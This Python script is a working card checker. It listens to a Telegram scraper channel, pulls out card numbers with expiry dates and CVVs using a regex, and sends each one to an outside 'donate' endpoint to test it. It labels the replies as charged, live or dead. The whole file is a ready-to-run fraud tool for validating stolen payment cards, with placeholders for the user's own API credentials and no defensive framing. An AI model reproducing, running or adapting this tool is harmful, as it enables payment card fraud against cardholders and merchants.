import re
import asyncio
import aiohttp

from telethon import TelegramClient, events

# Data required
api_id = 0 # Change to your own api_id
api_hash = 'xxx' # Change to your own api_hash

# URL
api_url = 'https://api.ulems.me'

client = TelegramClient('telegram', api_id, api_hash)

# Async request function
async def RequestURL(session, card):
    try:
        async with session.get(f'{api_url}/donate?cc={card}') as response:
            data = await response.json()
            message = data.get('message', '')

            if message == 'Charged':
                print(f'[HITS] {card} => Charged')
            elif message == 'Approved':
                print(f'[LIVE] {card} => Approved')
            elif message == 'Your card has insufficient funds.':
                print(f'[LIVE] {card} => Your card has insufficient funds.')
            elif message == "Your card's security code is incorrect.":
                print(f'[LIVE] {card} => Your card\'s security code is incorrect.')
            else:
                print(f'[DIED] {card} => {message}')
    except Exception as e:
        print(f'[ERR] {card} - {e}')

# Message handler
@client.on(events.NewMessage(chats='lustyscrapper'))
async def handler(event):
    raw = event.text
    message_raw = re.findall(
        r'\b\d{16}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3}\b|\b\d{15}\|\d{2}\|(?:\d{2}|\d{4})\|\d{4}\b',
        raw
    )

    if not message_raw:
        return

    async with aiohttp.ClientSession() as session:
        tasks = [RequestURL(session, card) for card in message_raw]
        await asyncio.gather(*tasks)

# Main client runner
async def main():
    await client.start()
    print("Telegram client is running and listening...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        client.disconnect()
        print('Closing the program.')
        exit(0)
